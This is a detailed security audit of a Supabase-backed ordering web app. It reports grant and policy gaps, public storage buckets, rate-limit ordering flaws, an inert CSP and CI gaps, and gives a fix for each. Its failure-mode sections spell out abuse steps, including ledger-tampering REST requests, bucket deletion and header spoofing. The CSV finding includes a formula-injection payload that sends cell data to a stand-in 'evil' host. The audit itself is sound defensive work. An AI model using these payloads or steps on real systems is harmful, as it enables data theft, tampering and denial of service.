# NexOrder — Production Security Audit

**Date:** 2026-08-19 · **Target:** `https://nexorder.com.au` (Amadiya Agro Products)
**Supabase project:** `lsgkznyiabqitqfpveey` (`ap-southeast-2`, Pro)
**Audited commit:** `8617bbc` — what production is actually serving
**Compared against:** `main` @ `189a23e`, 81 commits ahead

Successor to `PRODUCTION-READINESS-AUDIT.md` (2026-07-27) and to the readiness audit of
2026-08-14 (commit `6596b44`) whose twenty findings opened the SOC 2 risk register as
R-01…R-20. Read alongside `Compliance/_src/15-risk-register.md`; every finding below carries
its register mapping.

## Method, and what "verified" means here

Three parallel reviews — Edge Functions, database/RLS, client/build/deploy — across 71 Edge
Functions, 112 migrations and the full client tree. Findings were then re-derived by hand
wherever the conclusion was load-bearing; four were **corrected**, two down and two up, and
each correction is marked where it appears.

Two evidence classes, marked on every finding:

- **`[verified live]`** — confirmed by unauthenticated read-only HTTPS against
  `nexorder.com.au` during this audit. No credentials were used and nothing was written.
- **`[source]`** — derived by reading code and SQL in this checkout. Correct about what the
  repository says; **not** proof of the running database's state.

This audit was performed in the **development** workspace, which by design holds no Amadiya
credentials (`.env.amadiya.local` lives only in `C:\Users\dulsh\nexorder-amadiya`). Nothing
here could reach the client's database, and nothing tried. **Appendix A** is the read-only
runbook that converts every `[source]` finding into a `[verified live]` one; it should be run
before this report is treated as final.

---

## Verdict

**One production-shaped exposure needs a decision today, and it is a deployment, not a bug.**

The code has improved materially since July. The read-side lockdown landed (`00105`), the
demo-credential exposure that headed the last two audits is **genuinely gone from the live
bundle**, the auth core is sound, and the recovery/invite flow is now among the more carefully
built things in the repository. The write path was already good and still is.

What this audit found instead is a different shape of risk: **the controls are correct and
their enforcement is manual.** Nearly every finding below is either (a) a lockdown applied to
one role and not its twin, (b) a policy that exists but is inert, or (c) something CI could
assert in one line and does not.

Three things stand out.

1. **Production is six days and 81 commits behind, and a tag cut specifically as a security
   hotfix appears never to have been deployed.** `rel-2026-08-17-auth` exists, is annotated
   *"Security hotfix"*, and was cherry-picked onto the exact commit production runs so that it
   could ship alone — and `/version.json` still reports the un-hotfixed commit. §1.
2. **The order ledger is directly writable.** `orders` and `order_items` never had their
   grants revoked and three of their `00001` write policies were never dropped. An Admin can
   `DELETE` an order and a Manager can rewrite an invoiced line's price over PostgREST, with
   no audit row and no ledger correction. `CLAUDE.md` states twice that this is closed. DB-1.
3. **Proof-of-delivery evidence is world-readable and deletable by any login.** The
   `signatures` bucket is `public = true`, and its write policy is `FOR ALL TO authenticated`
   with no role predicate — and `FOR ALL` includes SELECT (list) and DELETE, for a customer
   account. `00081` fixed exactly this bug for `anon` and explicitly left the `authenticated`
   twin in place. STOR-1/STOR-2.

None of the three requires an attacker to be clever. Two require no credentials at all.

### Scorecard

Ratings carried from the July audit where the dimension is unchanged, so the two can be diffed.

| Dimension | Jul 27 | Aug 19 | One-line justification |
|---|---|---|---|
| Edge Function auth core | — | 🟢 Green | Server-side `getUser()` + `profiles` role lookup; role is not caller-supplied and cannot be spoofed |
| Write-path security (functions) | 🟢 Green | 🟢 Green | 69/71 gated, 68/71 rate-limited, all 9 `verify_jwt=false` carry a real in-body gate |
| Write-path security (direct DB) | 🟢 Green | 🔴 Red | `orders`/`order_items` grants never revoked — DB-1 |
| Read-path security | 🔴 Red | 🟢 Green | `00105` closed eight of nine `USING (true)` policies; `app_settings` remains, deliberately |
| Object storage | 🟠 Amber | 🔴 Red | Public buckets plus a role-blind `FOR ALL` write policy — STOR-1/2 |
| Secrets & credential hygiene | 🔴 Red | 🟢 Green | No env file ever committed; live bundle clean of demo credentials **[verified live]** |
| Transport & headers | 🟠 Amber | 🟠 Amber | HSTS/XFO/nosniff/Referrer correct; CSP inert — CSP-1 |
| Input validation | 🟠 Amber | 🟠 Amber | 57/71 functions use zod; the gaps include `invite-user` and `place-order` |
| Injection resistance | — | 🟢 Green | Zero raw SQL, zero `dangerouslySetInnerHTML`, all `EXECUTE` over catalogue identifiers |
| Rate limiting | 🟠 Amber | 🟠 Amber | Postgres-backed and broadly applied; the IP key is spoofable and one gate runs out of order |
| Release engineering | 🔴 Red | 🟠 Amber | The release-tag gate is real and well built — and was not used for the hotfix. §1 |
| Audit trail integrity | 🟠 Amber | 🟠 Amber | `audit_events` is unwritable by any client role; but DB-1's path produces no event at all |
| CI as a security control | 🔴 Red | 🟠 Amber | Blocks on every step and touches no secrets; asserts none of this report |

---

## 1. Deployment state — the finding that needs a decision today

**Severity: High · `[verified live]` · Register: new (proposed R-27)**

```
GET https://nexorder.com.au/version.json
→ {"sha":"8617bbc0906a8a196b6d088b06441aad07aa8876","builtAt":"2026-08-13T01:46:21.967Z"}
```

Production is serving the commit built on **13 August**. Two release tags have been cut since,
both of which contain that commit as an ancestor:

| Tag | Commit | Annotation |
|---|---|---|
| `rel-2026-08-17` | `9273724` | *"A refreshed password-reset screen no longer drops you into the app."* |
| `rel-2026-08-17-auth` | `a31ecc7` | *"**Security hotfix**, cut from the commit live on nexorder.com.au (8617bbc)."* |

The second tag exists *because* someone correctly decided the fix should ship without the rest.
Its own message says so: *"Deliberately NOT rel-2026-08-17, which additionally carries the Code
128 label programme, migration 00106 and a full Edge Function redeploy. Those want their own
release."* Seven files, no migration, no function change — the cheapest possible deploy.

The vulnerability it fixes, in its own words: *"a recovery or invite session could survive a
refresh as an ordinary login, rendering the app for a user who had never chosen a password.
Worst on the invite flow, where the account has no password at all."* This was reported on a
client's production domain on 2026-08-17.

**The tag was cut and, on the evidence of `/version.json`, not deployed.** The release-tag gate
in `scripts/deploy.mjs` is a genuinely good control — clean tree, annotated `rel-*` tag, tag an
ancestor of `main`. It is not the failure here. The failure is that nothing observes whether a
cut release actually reached the tenant.

Two further consequences of the same lag, both **[verified live]**:

- `Permissions-Policy: camera=()` is what production serves today. The `camera=(self)` fix is
  on `main` and not deployed, so **camera-based scanning is denied to the app's own origin on
  the live client site** — the exact bug the scan-gun hardening work identified, still live.
- Migrations `00106`–`00110` are unreleased. Whether they have been *applied* to the production
  database independently of the frontend cannot be determined from this workspace
  (Appendix A, step 1). A database ahead of its frontend is the more dangerous direction.

**Action.** Decide whether to deploy `rel-2026-08-17-auth` before reading further. It is a
seven-file, frontend-only release against the commit already running.

**Fix (process).** `deploy.mjs` already verifies `/version.json` *after* a deploy. The missing
control is the inverse: a check comparing the newest `rel-*` tag against the sha production
reports, failing loudly when a cut release has not landed. That is a `git tag` and a `fetch`.

---

## 2. Findings

Severity reflects exposure on the deployed system. Each finding names its evidence, the
concrete failure mode, the fix, and its risk-register mapping.

### 2.1 High

---

#### DB-1 · The order ledger is directly writable over PostgREST

**`[source]` · Register: new (proposed R-28) · Contradicts `CLAUDE.md`**

> **REMEDIATED 2026-08-19** — migrations `00111_order_cancellation.sql` and
> `00112_lockdown_order_writes.sql`, applied to `dev`. The three policies are
> dropped and the grants revoked; `authenticated` holds `SELECT` only and `anon`
> holds nothing. `CLAUDE.md`'s lockdown table is corrected, and
> `npm run check:grants:<target>` now asserts the claim against
> `information_schema` from `config/lockedTables.mjs` rather than leaving it in
> prose.
>
> Two things the finding did not say, both found by running its own Appendix A
> step 2 before writing the fix. **`anon` held the same INSERT/UPDATE/DELETE**,
> not just `authenticated` — every REVOKE since `00009` names `authenticated`
> alone while this project's `ALTER DEFAULT PRIVILEGES` grants all three roles.
> And **both roles held `TRUNCATE` on all 71 public tables**, which no migration
> has ever revoked from anyone; RLS cannot constrain `TRUNCATE`, so it sat
> outside every row-level lockdown claim in the repo. `00112` takes all of it
> for these two tables. The other ~35 are DB-3 and are recorded in
> `config/grantBaseline.mjs`, which the check prints on every run and fails on
> any addition to.
>
> The capability the revoke removes is replaced rather than dropped: `00111`
> adds a terminal `cancelled` status and the **`cancel-order`** Edge Function —
> Admin-only, reason mandatory, reservation released through the ledger, one
> audit event, refused if the order has been picked or its invoice paid.

`00001_initial_schema.sql:1084` grants `SELECT, INSERT, UPDATE, DELETE` on `orders` and
`order_items` to `authenticated`. The lockdown migrations then removed policies **selectively**
and never touched the grants:

- `00009:11-12` drops `orders_insert_authenticated` and `order_items_insert_authenticated`.
- `00010:7-8` drops `orders_update_admin_manager` and `orders_update_admin`.
- **Nothing** is dropped for `order_items` UPDATE, `order_items` DELETE, or `orders` DELETE.
- `00013`, which revokes grants on eleven other tables, deliberately skips these two on the
  grounds that `00009` had covered them. `00013:102,108` revoke `purchase_orders` and
  `purchase_order_items`; `orders` and `order_items` appear in no `REVOKE` anywhere in the
  112-file corpus.

Three policies from `00001` are therefore still live, each with a matching grant:

| Policy | Defined at | Effect |
|---|---|---|
| `orders_delete_admin` | `00001:676` | `FOR DELETE` where `user_role() = 'Admin'` |
| `order_items_update_admin_manager` | `00001:728` | `FOR UPDATE` where role ∈ (Admin, Manager) |
| `order_items_delete_admin_manager` | `00001:734` | `FOR DELETE` where role ∈ (Admin, Manager) |

**Failure mode.** A Manager issues `PATCH /rest/v1/order_items?id=eq.<n>` with
`{"quantity":1,"unit_price":0}` and rewrites a delivered, invoiced order line. No
`audit_events` row is written — `audit.ts` is only reached through an Edge Function. No
`orders.status` transition check runs. No compensating `inventory_movements` leg is created, so
`inventory_balances.available` now disagrees with the ledger permanently. An Admin issuing
`DELETE /rest/v1/orders?id=eq.<x>` removes the order while its allocation legs survive. Both
tables are in the realtime publication (`00015:14-15`), so the tampering propagates live to
every subscribed client.

This is the one place where the schema's otherwise reliable "no write policy → denied"
invariant does not hold, and it holds nowhere else by accident: `00017:48-51` drops **and**
revokes for `invoices`, which is the pattern these two tables needed.

**Fix.** One migration:

```sql
DROP POLICY IF EXISTS "orders_delete_admin"              ON public.orders;
DROP POLICY IF EXISTS "order_items_update_admin_manager" ON public.order_items;
DROP POLICY IF EXISTS "order_items_delete_admin_manager" ON public.order_items;
REVOKE INSERT, UPDATE, DELETE ON public.orders, public.order_items FROM authenticated;
```

No legitimate capability is removed: every write path already routes through `place-order` and
`update-order-status`. Verify with Appendix A step 2 **before** shipping — if an operator
workflow does depend on one of these, it is doing so silently and unaudited, and that is worth
knowing first.

---

#### STOR-1 · Any authenticated user can list and delete every object in five buckets

**`[source]` · Register: extends R-02 (recorded closed — this is the other half)**

The five `auth_write_*` policies are, verbatim in shape:

```sql
CREATE POLICY "auth_write_signatures"
  ON storage.objects FOR ALL TO authenticated
  USING (bucket_id = 'signatures')
  WITH CHECK (bucket_id = 'signatures');
```

`00004:32,37,42` (`company-assets`, `visit-photos`, `signatures`) and `00024:29,34`
(`product-images`, `avatars`). The only predicate is the bucket name. No role check, no
`owner = auth.uid()`, no path prefix. Every internal role **and `Restaurant/Hotel Customer`**
satisfies `TO authenticated`, and `FOR ALL` covers SELECT — which on `storage.objects` is the
*list* operation — as well as UPDATE and DELETE.

**Failure mode**, executable by a customer login using the app's own JS client:

1. `supabase.storage.from('signatures').list()` → every proof-of-delivery object path.
2. `supabase.storage.from('signatures').remove([...])` → **destroys the delivery evidence for
   every dispatched order.** No `audit_events` row; this path never touches an Edge Function.
3. `supabase.storage.from('company-assets').upload('logo.png', evil, {upsert:true})` →
   replaces the operator's logo, which `00005:2` wires into `app_settings.company_logo_url`
   and therefore onto every invoice and generated PDF.

`00004:30-31` acknowledged this when the policies were written — *"per-user gating happens
client-side via role checks; once auth is wired and RLS re-enabled this should be tightened."*
Auth and RLS were wired in `00008`–`00013`. `00081` then fixed the **identical** bug for `anon`
and stated explicitly that *"the matching `auth_write_*` policies from the same two migrations
are left in place."* The July audit closed the `anon` half as R-02; the `authenticated` half
was never opened as a finding.

**Fix.** Replace all five with per-verb policies: `company-assets` and `product-images` gated
on `public.user_is_staff()`; `avatars` gated on `owner = auth.uid()`; `signatures` and
`visit-photos` made service-role-write-only, matching what `order-documents` (`00031`) and
`warehouse-labels` (`00074`) already do correctly.

---

#### STOR-2 · Signatures and premises photographs are world-readable

**`[source]` · Register: R-02, which is recorded as closed and is not**

`00004:5-11` and `00024:11-16` insert all five buckets with `public = true`. In Supabase that
exposes `/storage/v1/object/public/<bucket>/<path>` through the CDN **with no JWT and with
`storage.objects` RLS not consulted at all** — the `public_read_*` policies at `00004:18,22,26`
and `00024:20,24` are therefore decorative for the CDN path, and give a misleading impression
that access is policy-mediated.

`signatures` holds customer handwritten signatures: biometric-adjacent personal information,
and the sole evidentiary artefact for a dispatched order. `visit-photos` holds field-sales
photographs of customer premises. Both are readable by anyone holding a URL.

The justification at `00004:15-17` — *"they hold non-sensitive public-by-design assets… Object
URLs are unguessable UUID-prefixed paths"* — is obscurity rather than access control, and
**STOR-1 defeats it three lines further down the same file**: the `FOR ALL TO authenticated`
policy permits `list()`, so any login can harvest every path and then read the objects with no
authentication at all.

R-02 in the risk register reads *"Customer signatures, premises photographs and staff avatars
were world-readable. Proven live. Closed by making the buckets private and issuing access
through audited signed URLs"* — status *"closed, pending verification evidence"*. **The
migrations in this repository contain no such change.** Either the change was made directly
against the production project without a migration, or R-02 is closed in error. Appendix A
step 4 settles it, and it is the single most important check in that appendix.

**Fix.** `UPDATE storage.buckets SET public = false WHERE id IN ('signatures','visit-photos')`
and move both read paths to signed URLs — the pattern `00074:104` already uses. Then correct
or confirm R-02.

---

#### FN-1 · `send-email` can be silenced by an unauthenticated caller

**`[source]` · Register: extends R-14 · Denial of service, no credentials required**

`supabase/functions/send-email/index.ts` applies its rate limit at `:78` and its authentication
gate at `:91` — in that order:

```ts
const rl = await checkRateLimit(`send-email:${ip}`, { windowMs: 60_000, max: 20 })   // :78
…
if (!isServiceRoleCall(req.headers.get('Authorization'))) { … }                       // :91
```

The bucket key comes from `clientIp()` (`_shared/rateLimit.ts:121-122`), which returns the
**first** hop of the caller-supplied `x-forwarded-for` header. Function-to-function calls carry
no `x-forwarded-for` at all, so the real internal callers — `place-order/index.ts:510` and
`health/index.ts:207` — land in the bucket `send-email:unknown`.

**Failure mode.** An unauthenticated attacker sends 20 requests per minute with
`X-Forwarded-For: unknown`. Every one is rejected at `:91` as unauthorised — *after* it has
consumed a slot. For the remainder of the window every genuine order-confirmation email is
dropped with a 429 before the auth check runs. Cost to the attacker: no credentials, twenty
requests.

The gate itself is correct and constant-time (`_shared/cronToken.ts:11-18`); this is purely an
ordering defect, and `send-email` is the one function where it is reachable, because the other
`verify_jwt = false` functions either have no limiter or are anonymous by design.

**Fix.** Move the `isServiceRoleCall` check above `checkRateLimit`, and key the limiter on the
authenticated caller rather than on the IP. Two lines.

---

#### DB-3 · `anon` and `authenticated` may hold full CRUD on ~53 tables by default privilege

**`[source]`, and the source is a comment — confirm before acting · Register: new (proposed R-29)**

`00102_held_locations_grants.sql:6-10` records, from a live `information_schema` check run
against **dev**:

> *"this project carries ALTER DEFAULT PRIVILEGES for anon / authenticated / service_role on
> new objects in `public`, so the view was created with SELECT (and INSERT, UPDATE, DELETE,
> TRUNCATE, REFERENCES, TRIGGER) already granted to all three."*

`00102` treats this as a one-off about one view. If the observation is correct and also true of
the production project, its actual scope is **every object created in `public` from `00012`
onward** — roughly 53 tables — each granted full CRUD to `anon` and `authenticated` at
`CREATE TABLE` time. Only six objects were subsequently revoked: `rate_limit_counters`
(`00026:54`), `environment_marker` (`00086:48`), `product_embeddings` (`00089:66`),
`v_held_locations` (`00102:33`), and the write half of `health_checks`/`deployments`
(`00059:54,89`).

Three consequences:

1. **RLS becomes the sole gate**, not the second of two. Every "no write policy → denied"
   conclusion in this report and in the migration corpus holds *only* while RLS is enabled.
2. **Several migration comments are then factually wrong.** `00027:621-622` states *"Table
   grants: SELECT only for authenticated… No write grants"* for `inventory_movements`;
   `00018:422-424` states `oauth_pending_states` is *"intentionally excluded"* from grants;
   `00074:159`, `00106:63` and `00110:78` repeat the same premise.
3. `00001:1109` — *"anon role: no table access… No additional grants needed for anon beyond
   schema USAGE"* — was true for the eighteen tables in `00001` and has been untrue for every
   table added since.

**No `ALTER DEFAULT PRIVILEGES` for schema `public` exists anywhere in the migrations** — I
checked all 112 files; the only two are `00020:80-81`, which correctly lock down the `net`
schema. So this is a platform-level default, not something the repository did, and it can only
be confirmed against the running project. **Appendix A step 3 is decisive: run it before
treating this as High.**

**Fix, if confirmed.** One migration mirroring what `00020` already does for `net`:
`REVOKE ALL ON ALL TABLES IN SCHEMA public FROM anon;` followed by explicit re-grants, plus
`ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE ALL ON TABLES FROM anon, authenticated;`.
Sequence it **after** DB-1 and STOR-1/2 so the explicit re-grant list is already correct.

### 2.2 Medium

---

**DB-2 · `handling_unit_anomalies` is a definer-rights view · `[source]`**
`00075:850` creates the view; `00075:881` grants `SELECT` to `authenticated`. It carries **no
`WITH (security_invoker = true)`** — and I verified that the only occurrence of that option in
the entire corpus is `00078:68`, on `v_bin_fill`. A view without it executes with the owner's
privileges (`postgres`), so RLS on `handling_units` (`00075:870`) and `inventory_balances`
(`00027:587`) does not apply to reads through it. Mitigating: the `HAVING COUNT(DISTINCT
b.location_id) > 1` clause at `00075:860` means the result is empty in a healthy system — the
leak materialises precisely during an inventory incident. The identical assumption was caught
for `v_held_locations` by `00102` and never re-checked here.
**Fix.** `ALTER VIEW public.handling_unit_anomalies SET (security_invoker = true);`

**DB-4 · Two `SECURITY DEFINER` functions hand facility topology to any login · `[source]`**
`wie_layout_label_targets` (`00084:136`) and `wie_layout_label_status` (`00084:256`) are
`SECURITY DEFINER`, granted to `authenticated` (`00084:279-280`), and contain **no role check
of any kind**. `p_layout_id` is a small integer and trivially enumerable. A Restaurant/Hotel
Customer login calling `POST /rest/v1/rpc/wie_layout_label_targets` receives every location id,
code, kind, friendly name, enclosing zone, aisle code and level role in the warehouse — the
operator's complete physical topology, which RLS otherwise restricts to five internal roles.
The comment at `00084:277-278` defends the definer rights as *"for the recursive walk over
locations, not to widen access"*; definer rights always widen access, and the sentence is true
only of the ops roles, not of the `authenticated` role the grant actually names.
**Fix.** `IF NOT public.user_is_staff() THEN RAISE EXCEPTION …` at the top of each, or move the
grant to `service_role` and route through an Edge Function.

**DB-5 · `wie_replen_config_rows` fails open on a NULL role · `[source]`**
`00093:59-63`:

```sql
v_role := public.user_role();
IF v_role IS NOT NULL AND v_role NOT IN ('Admin', 'Manager') THEN
    RAISE EXCEPTION 'FORBIDDEN: …';
END IF;
```

A NULL role **passes**. The comment justifies this as the service-role path, where `auth.uid()`
is null — but `user_role()` returns NULL for two distinct cases, and the second is a valid
`authenticated` JWT whose `profiles` row no longer exists. That is exactly an offboarded user,
and R-03 records that there is no working offboarding path. Every other definer function in the
schema fails closed; `user_is_staff()` (`00105:96`) does it correctly with
`COALESCE(…, FALSE)`.
**Fix.** `IF NOT (v_role IN ('Admin','Manager')) THEN RAISE` — NULL then fails.

**FN-2 · `x-forwarded-for` is trusted unvalidated across every IP-keyed limiter · `[source]`**
`_shared/rateLimit.ts:121-122` takes the first hop of a caller-supplied header. Rotating it
makes each IP-keyed cap effectively unlimited. Affects `log-client-error` (30/min), `health`
GET (10/min), `send-email` (20/min, see FN-1) and the OAuth callbacks (30/min). Worst on
`log-client-error`, which is anonymous by design (`verify_jwt = false`, no gate) and writes to
`client_errors` using the **service-role** client (`log-client-error/index.ts:99-112`): an
unauthenticated, effectively unbounded database-write primitive. It also feeds `health`'s
`error_count_10m` (`health/index.ts:149-153`), so a flood can drive the deployment to
`degraded` and trigger `system_alert` emails.
**Fix.** Derive the client IP from the rightmost trusted hop rather than `[0]`, and treat
`unknown` as its own non-poolable bucket. Add a row cap or retention window on `client_errors`
(which also serves R-06).

**FN-3 · Warehouse role is not site-scoped on seven functions · `[source]`**
Twelve functions correctly check `home_warehouse_id` (e.g. `adjust-stock:102`, `record-pick:87`,
`decide-putaway:124`). These seven do not: `order-pick-tasks`, `release-quarantine`,
`confirm-label-print`, `generate-labels`, `generate-pick-slip`, `generate-dispatch-advice`,
`create-order-document-url`. All query through the service-role client, so RLS provides no
backstop. A Warehouse user homed at site A can read pick tasks, pick slips, dispatch advice and
label runs for site B — and `release-quarantine` **moves stock** at a site the operator has no
relationship with.
**Fix.** Add the same guard the other twelve use, `release-quarantine` first.

**FN-4 · Raw Postgres error text returned to callers · `[source]`**
Roughly 51 functions terminate with `errorResponse('INTERNAL', e instanceof Error ? e.message : …)`,
leaking table names, column names, constraint names, RPC signatures and parse errors. Most are
role-gated, but two are not: `log-client-error:125` and `send-email:162` are both
`verify_jwt = false`, so an unauthenticated caller can read internal schema detail from them.
`approve-po/index.ts:193` and `create-po-document-url:134` already do it correctly with a
generic string.
**Fix.** Generic message to the caller, `console.error` for the detail. Follow `approve-po`.

**FN-5 · `invite-user` hand-rolls its gate and writes an unvalidated URL · `[source]`**
`invite-user` is the one privileged function that re-implements `requireAuth` inline
(`:120-132`) instead of using the shared helper, and it uses no zod schema. `body.avatarUrl` is
written straight to `profiles.avatar_url` at `:193` with **no validation at all**, where
`mutate-profile/index.ts:26` enforces `z.string().url()` on the same column — so a
`javascript:` or `data:` URI can be planted in a field the UI renders. Admin-gated, so
exploitation requires an Admin account; the concern is that the app's most privileged
provisioning endpoint is also its least validated. `:178-179` is additionally a user-existence
oracle.
**Fix.** Port onto `requireAuth` plus a zod schema mirroring `mutate-profile`'s. This also
addresses part of R-17 and, by adding an audit event on invitation, R-04.

**CSP-1 · The Content Security Policy is entirely inert · `[verified live]` · Register: R-12**
Production serves:

```
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; …
```

Report-Only **and** — confirmed against the live header — carrying no `report-uri` and no
`report-to`. The browser therefore neither enforces the policy nor sends violation reports
anywhere. `script-src 'self'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'` and
`frame-ancestors 'none'` are all decorative. R-12's treatment — *"add the endpoint, confirm
clean, then enforce, in that order"* — is exactly right and has not started; with no endpoint,
no data has ever been collected to de-risk the promotion.
The policy itself is well constructed: no `unsafe-inline` or `unsafe-eval` in `script-src`,
hosts correctly scoped to `lsgkznyiabqitqfpveey`. `X-Frame-Options: DENY` does cover the
`frame-ancestors` gap. Everything else in the header set is correct (HSTS two years with
`includeSubDomains`, `nosniff`, `strict-origin-when-cross-origin`); there is no COOP/COEP.
**Fix.** Add a reporting endpoint, observe for a week, then flip to enforcing.

**CSP-2 · The CSP guard cannot detect that the policy is Report-Only · `[source]`**
`scripts/check-csp.mjs:70` matches `/^content-security-policy(-report-only)?$/i` — either
header satisfies it — and `REQUIRED_DIRECTIVES` (`:32`) is only
`['img-src','connect-src','frame-src']`. The guard validates *hosts*, never *enforcement*, and
never inspects `script-src`. Adding `'unsafe-eval'` to `script-src` passes CI green. The
`/storage` rewrite-ordering assertion in the same file (`:97-108`) is genuinely good and should
be the model.
**Fix.** Assert the header name, and assert that `script-src` contains neither `unsafe-inline`
nor `unsafe-eval`. Two `if`s.

**CL-1 · Sign-out does not clear the query cache · `[source]` · Register: extends R-11**
`hooks/useAuth.ts:137-138` calls only `supabase.auth.signOut()`. There is no `queryClient.clear()`
or `removeQueries()` anywhere in the tree, and `lib/queryClient.ts:6` sets a five-minute
`staleTime`.
**Failure mode**, and it is a realistic one on this system: on a shared warehouse handheld,
operator A signs out, the `LoginPage` renders, operator B signs in **in the same tab with no
page reload** — and the cache still holds A's orders, customers, contract pricing, invoices and
profile, served from memory for up to five minutes before any refetch. The same applies after
the 30-minute idle sign-out at `App.tsx:51-61`.
**Fix.** `queryClient.clear()` in `signOut`, before or after the Supabase call.

**CL-2 · CSV exports are formula-injection sinks · `[source]` · Register: new (proposed R-30)**
`lib/csvExport.ts:7` is `` `"${val.replace(/"/g, '""')}"` `` — correct RFC-4180 quoting, and no
protection whatsoever against a leading `=`, `+`, `-`, `@`, tab or carriage return. Excel and
LibreOffice evaluate a leading `=` inside a quoted field.
What makes this more than theoretical here is the data's provenance: the order export
(`OrderImportPage.tsx:512,517`) carries rows that originated in the PO Inbox — product
descriptions, customer names and reference fields lifted by `extract-po` from **inbound
customer email**, supplied by a party who never authenticates. A supplier emails a purchase
order whose line description is `=HYPERLINK("https://evil/?d="&A1&A2,"Click")`; it is approved
into `orders`; an admin later exports and opens the file. The audit-log export
(`AuditLogTab.tsx:139,154`) and the replenishment export are the same shape.
**Fix.** Prefix `'` when `/^[=+\-@\t\r]/.test(val)`. One line, in one file, covering all six
export paths.

**CI-1 · CI blocks correctly and asserts none of this · `[source]` · Register: R-18**
`.github/workflows/ci.yml` is well built: `npm ci` → `npm audit --omit=dev --audit-level=high`
→ overlay guard → CSP guard → `tsc --noEmit` → `npm test` → `npm run build`, every step
blocking, no `continue-on-error`, **no secrets referenced at all**, no `pull_request_target`,
Node pinned with a documented reason. What it does not do is assert any of the properties this
report is about: no check that `VITE_SHOW_DEMO_LOGINS=false` for a tenant build, no
`grep -r Password123 dist/` — despite `LoginPage.tsx:41` literally instructing a human to run
that after every build — no CSP enforcement-mode check, no drift check between the direct-write
call sites and the documented Edge-Function contract. Each is one bash step.
R-18 also names the missing secret-scanning and static-analysis steps, and the fact that
`npm audit --omit=dev` excludes the build chain. That exclusion is defensible for runtime risk
but note that `@vercel/config` — a dev dependency with a high-severity advisory whose only
"fix" is a major downgrade — is what generates the production security headers.

**REPO-1 · A committed settings file re-enables MCP servers automatically · `[source]`**
`.claude/settings.local.json` is tracked in git (force-added past `.gitignore`'s `*.local`) and
contains `enableAllProjectMcpServers: true` alongside `enabledMcpjsonServers: ["supabase"]`.
`.mcp.json` was deliberately emptied to `{}` with a nine-line rationale, because the previous
entry pointed at what is now the client's production database, and CLAUDE.md names an agent
session with MCP write access to a client database as the single largest unforced risk in the
repository. **That safeguard is a comment; the auto-enable is executable configuration that
outlives it.** Anyone re-adding any server to `.mcp.json` — including one named `supabase` —
gets it enabled in every checkout with no consent prompt.
The compensating controls are real and well built: the `PreToolUse` hook at
`scripts/claude/guard-workspace.mjs` derives tenant-ness from the presence of a `kind:'tenant'`
env file rather than hardcoding, and the genuine wall is that `.env.amadiya.local` is not in
this checkout at all.
**Fix.** `git rm --cached .claude/settings.local.json` and drop `enableAllProjectMcpServers`.

### 2.3 Low and informational

| ID | Finding | Evidence |
|---|---|---|
| L-1 | **`company-assets` accepts `image/svg+xml`** (`00004:8`), and the `/storage` rewrite (`vercel.ts:81-83`) serves it from the app's own origin, where an inert CSP (CSP-1) would not stop its script. **Corrected down from a subagent's High:** `visit-photos` and `product-images` permit only png/jpeg/webp (`00004:9`, `00024:13-15`), so the unguarded `PhotoUpload.tsx:33` path is *not* exploitable, and the logo upload that is (`GeneralTab.tsx:125`) is Admin-only. Fix is to drop `svg` from that bucket's `allowed_mime_types` and from `storageService.ts:71`. | `00004:8` |
| L-2 | **Demo credentials: clean in production, unenforced in code.** `[verified live]` — the live bundle `/assets/index-CcAsHiUm.js` contains neither `Password123` nor `alice@nexorder.com.au`, and names only `lsgkznyiabqitqfpveey`. **Corrected down from a subagent's conditional Critical.** But `LoginPage.tsx:42` still defaults the flag *on* (`!== 'false'`), and nothing in CI or `deploy.mjs` asserts it for a tenant build — `deploy.mjs:93` already computes `isTenant`. R-01's treatment is exactly this build-time assertion. | R-01 |
| L-3 | **`profiles.email` is self-writable from the client.** `AppShell.tsx:1404-1408` updates `profiles` directly, bypassing the documented `invite-user` path. `email` is not in `00011:16`'s revoked column list, so a Field Rep can set their displayed address to the Admin's and appear as them in user lists. No authentication impact — `auth.users.email` is unaffected — but attribution and impersonation impact. | `AppShell.tsx:1404` |
| L-4 | **`default_tenant()` is granted to `anon`** (`00087:52`). It is `SECURITY DEFINER` over `environment_marker`, a table explicitly `REVOKE ALL`'d from anon and authenticated (`00086:48`). Any holder of the publishable key can `POST /rest/v1/rpc/default_tenant` and read `tenant_key`. Deliberate for the column-DEFAULT reason at `00087:30-34`, but `authenticated` would satisfy that reason. | `00087:52` |
| L-5 | **LIKE-pattern injection in the `wie_*_locations_tx` family.** `p_warehouse_path` is concatenated into a `LIKE` pattern with no escaping (`00094:143`, `00096:135`, `00107:246`), so `'%'` defeats the scope guard entirely. Not client-reachable — all three are service-role-only — but it is a defence-in-depth control that does not hold against the input `00094:88-91` says it exists to distrust. | `00094:143` |
| L-6 | **`notifications` is an unaudited in-product messaging primitive.** `00013:20-21` deliberately leaves the grants intact, so Admin/Manager can insert arbitrary notifications straight from the browser with no audit row, and any user can rewrite the text of one addressed to them. | `00001:1002,1008` |
| L-7 | **Four client writes contradict the documented contract and are dead.** `horecaService.ts:65,84,97` and `invoiceService.ts:43` write tables whose grants `00013:48,54` and `00017:51` revoked. The server holds — but `markHoReCaReviewed`, `upsertHoReCaPricing`, `deleteHoReCaPricing` and `createInvoice` are unreachable features that fail as a generic "Error saving…" toast. | `horecaService.ts:65` |
| L-8 | **Session and refresh token live in `localStorage`** (`lib/supabase.ts:71`). The persistence decision is correct and well argued — the alternative logged warehouse staff out hourly mid-shift — but its compensating control is an enforced CSP, which is CSP-1. | `lib/supabase.ts:71` |
| L-9 | **Client-side password floor is 8 characters** (`ResetPasswordView.tsx:237`) with no complexity requirement. The real floor is server-side; `config/environments.mjs:206-217` records that an all-or-nothing PATCH once left **dev** accepting 6-character passwords and allowing public signup. Appendix A step 7 confirms the tenant's. | R-05 adjacent |
| L-10 | **`Permissions-Policy: camera=()` is live in production**, denying the camera to the app's own origin — a functionality failure, not a security one, and a consequence of §1's deploy lag. | `[verified live]` |
| I-1 | **`index.tsx:94` assigns `document.body.innerHTML` from a template literal** in the OAuth-popup fallback. Safe as written — the only interpolations are literal ternary branches, and the attacker-controllable params go into the `postMessage` payload, not the HTML — but one edit from stored XSS. Worth a `textContent` rewrite or a comment. | `index.tsx:94` |
| I-2 | **All seven `npm audit` findings are dev-only**; `npm audit --omit=dev --audit-level=high` reports zero, which is what CI gates. The runtime bundle is clean. | `ci.yml:38` |
